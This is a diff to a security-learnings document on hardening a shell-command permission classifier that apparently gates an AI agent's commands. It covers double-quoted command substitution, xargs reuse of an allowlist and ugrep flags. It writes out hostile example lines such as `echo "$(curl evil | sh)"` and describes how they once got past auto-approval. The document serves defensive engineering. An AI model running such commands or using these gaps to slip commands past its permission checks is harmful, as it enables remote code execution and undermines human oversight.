@@ -7,7 +7,7 @@ component: permission-classifier
 problem_type: security_issue
 category: security-issues
 severity: critical
-tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, symlink, toctou, command-substitution, find-exec, ref-resolution, make, funsub, bash-5.3, claude-pilot-25, claude-pilot-33, claude-pilot-34, claude-pilot-35, claude-pilot-37, claude-pilot-43, claude-pilot-45, claude-pilot-47]
+tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, symlink, toctou, command-substitution, find-exec, xargs, ugrep, double-quote, ref-resolution, make, funsub, bash-5.3, claude-pilot-25, claude-pilot-33, claude-pilot-34, claude-pilot-35, claude-pilot-37, claude-pilot-40, claude-pilot-41, claude-pilot-43, claude-pilot-44, claude-pilot-45, claude-pilot-47]
 applies_when: "adding or reviewing any rule that decides allow/deny on a raw shell command string"
 ---
 
@@ -233,8 +233,15 @@ Two allowlist entries violated that:
 - `grep`/`egrep`/`fgrep` are read-only **only under GNU grep**. `ugrep` (a drop-in
   `grep` on some Gentoo/BSD/Homebrew hosts) adds `--filter=CMD` / `--pager` /
   `--view`. Kept (the founding use case *is* `find -exec grep`), but the GNU-grep
-  assumption is now a documented **load-bearing precondition** in the allowlist
-  comment, with claude-pilot#44 tracking the runtime grep-provider check.
+  assumption is a documented **load-bearing precondition** in the allowlist
+  comment. **Resolved (claude-pilot#44):** the cpp#33 security review empirically
+  verified the deployment containers resolve `find -exec` to GNU `/bin/grep` 3.12
+  (which rejects `--filter`), so the ugrep vector is not live in the deployment
+  target; the precondition is an **accepted + tracked risk**, not an open bug. The
+  hardening boundary is fixed: if a ugrep-as-`grep` host ever enters scope, **drop**
+  the grep-family entries — never denylist `--filter`/`--pager`/`--view` by parsing
+  inner args (§4). A startup-time ugrep-detection warning, if ever wanted, belongs
+  in `cli.py`, not the pure subprocess-free classifier.
 
 ```python
 # WRONG — "they're search tools, they're read-only"
@@ -261,6 +268,18 @@ The unifying rule: a closed-world allowlist fails open in two places a name list
 hides — an *entry* whose own flags exec/write, and an *action* of a multi-action
 command that the guard didn't enumerate. Verify the premise of each entry; deny
 the unknown action.
+
+**One allowlist, multiple front-ends (claude-pilot#40).** `xargs <cmd>` runs `<cmd>`
+per stdin record — the same "the inner token is the binary that executes" shape as
+`find -exec`. So the blanket `xargs` TIER3 deny was relaxed by **reusing the SAME
+`FIND_EXEC_SAFE_COMMANDS` set**, not by introducing a parallel xargs allowlist.
+`_is_safe_xargs_command` skips xargs' own flags structurally (`-I {}`, `-n N`,
+`-P N`, `-0`, `-d <delim>`, …) to find the first non-flag token, then matches it
+exact-literal against the shared set — never lexing the inner command's arguments
+(§4 discipline). One consequence to keep in mind: the grep-family GNU-grep
+precondition above now governs **both** `find -exec grep` and `xargs grep`. When an
+allowlist gets a second consumer, the read-only premise of every entry must hold for
+the new front-end too — here it does, because both run the inner command directly.
 
 ### 7. A regex's syntactic shape is not a runtime-identity guarantee — document what the matched bytes can REFER TO, not what they look like
 
@@ -386,6 +405,54 @@ Generalization: when a marker set encodes "the dangerous forms of X", record the
 bump. The symmetric `permission_pre_classifier.rs` in mika (see Related) is the same
 class and the same re-audit candidate.
 
+### 10. A quote-aware substitution scanner must suppress on SINGLE quotes only — double quotes do NOT make `$(`/backtick inert
+
+`contains_unquoted_metacharacter` (tier1) is the scanner that backstops every
+safe-listed command against command substitution. Its original quote state machine
+treated **both** quote kinds as suppressing: inside `"…"` it scanned only for the
+escape pair and the closing quote, never for substitution markers. But bash performs
+command substitution **inside double quotes** — only single quotes are literal. So
+`grep "$(id)"` / `echo "$(curl evil | sh)"` returned `cum=False`, auto-approved, and
+bash ran the inner command — an RCE for any safe-listed leaf (claude-pilot#41,
+empirically reproduced on `main`). The `find -exec` path was *independently* safe
+(its own `"$(" in sub` guard, §6), so this was the residual hole for every other
+command.
+
+The fix is to scan double-quoted regions for the markers bash actually expands
+there, while keeping single-quoted regions fully inert:
+
+```python
+# Inside a double-quoted region, after the \X escape-pair skip and the close check:
+if quote_state == '"':
+    if ch == "`":                                   return True
+    if ch == "$" and peek == "(":                   return True
+    # NOTE: $' is NOT flagged inside double quotes — ANSI-C $'...' quoting is only
+    # recognized OUTSIDE quotes; inside "..." it is a literal $ + apostrophe.
+```
+
+Three subtleties that make this correct, not just "scan everywhere":
+
+1. **Single quotes still suppress.** `echo '$(literal)'` stays allowed — bash treats
+   single-quoted content as literal. Only the double-quote branch gains the markers.
+2. **The `\X` escape pair already does the right thing.** A backslash inside double
+   quotes suppresses `$`/backtick (`"\$(x)"` is literal), and the pre-existing pair
+   skip consumes `\X` before the marker test — so a *suppressed* substitution is
+   correctly NOT flagged, and `\"` correctly does not close the region (markers after
+   it stay flagged).
+3. **`$'` is quote-context-dependent, unlike `$(`/backtick.** ANSI-C `$'…'` quoting is
+   only a thing *outside* quotes; inside `"…"` it's inert. So the `$'` marker stays in
+   the unquoted branch only (mika#944) — flagging it inside double quotes would be a
+   false positive. The "treat the marker the same regardless of quoting" shorthand is
+   right for `$(`/backtick and *wrong* for `$'`; verify each marker against the shell,
+   don't generalize the rule across markers.
+
+This is a real behavior change, not just a hole-plug: a `mika ask` brief whose
+markdown carries inline-code backticks **inside double quotes** now routes to the
+relay instead of auto-approving (correct — bash would substitute them). Briefs that
+must auto-approve should single-quote the payload. The Rust mirror
+(`permission_pre_classifier.rs`) has the same gap and is the paired-audit follow-up;
+the Python side intentionally diverges (hardened) until the Rust side mirrors.
+
 ## When to Apply
 
 - Adding/reviewing any `permissions.yaml` rule, or any code deciding allow/deny on
@@ -404,6 +471,14 @@ class and the same re-audit candidate.
 - A major shell/runtime version bump: re-audit the substitution marker set against the
   new grammar — bash 5.3's K-style funsub `${ … }` was a new injection form the
   original `$(`/backtick/`$'` set did not cover (§9).
+- Writing or reviewing a quote-aware substitution scanner: suppress markers on SINGLE
+  quotes only — double quotes still expand `$(`/backtick — and verify each marker
+  against the shell rather than generalizing one marker's quoting rule to all (`$'` is
+  inert inside double quotes; `$(`/backtick are not) (§10).
+- Relaxing a blanket deny by reusing an existing allowlist for a new front-end (e.g.
+  `xargs` reusing `FIND_EXEC_SAFE_COMMANDS`): re-confirm every entry's read-only
+  premise holds for the new consumer, and skip the new command's flags structurally,
+  never lexing the inner command (§4, §6).
 - Reviewing `tier1.py` / `policy.py` / `permissions.py` in claude-pilot.
 
 ## Related
@@ -415,12 +490,13 @@ class and the same re-audit candidate.
   (`contains_unquoted_metacharacter` mirrors tier1; mika#944/#946). The
   denylist-incompleteness and the `awk`/`sed`/`find` `system()`-exec gap likely
   exist symmetrically there.
-- **Open follow-ups from §6 (claude-pilot#33):** claude-pilot#41 — the broader
-  `contains_unquoted_metacharacter` gap (it misses `$()`/backtick **inside double
-  quotes**, so `echo "$(curl evil|sh)"` auto-approves on the non-find path;
-  another paired-audit candidate with the Rust scanner). claude-pilot#44 — verify
-  the pilot container's `grep` provider is GNU grep, the load-bearing precondition
-  for keeping `grep`/`egrep`/`fgrep` on `FIND_EXEC_SAFE_COMMANDS`.
+- **Resolved follow-ups from §6 (claude-pilot#33):** claude-pilot#41 — the broader
+  `contains_unquoted_metacharacter` gap (missed `$()`/backtick **inside double
+  quotes**) is **fixed on the Python side** (§10); the Rust scanner mirror remains a
+  paired-audit follow-up. claude-pilot#40 — `xargs <readonly-cmd>` now reuses the same
+  `FIND_EXEC_SAFE_COMMANDS` allowlist (§6). claude-pilot#44 — the GNU-grep precondition
+  for `grep`/`egrep`/`fgrep` is **resolved** (verified GNU grep in the deployment
+  containers; accepted + tracked risk; §6).
 - Accepted residuals (not bugs): in-worktree code execution (`node ./build.js`,
   `cargo test`, `uv run pytest` run project code — the worktree is the trust
   boundary); `npm install`/`uv add` run package scripts; **symlink/TOCTOU on any
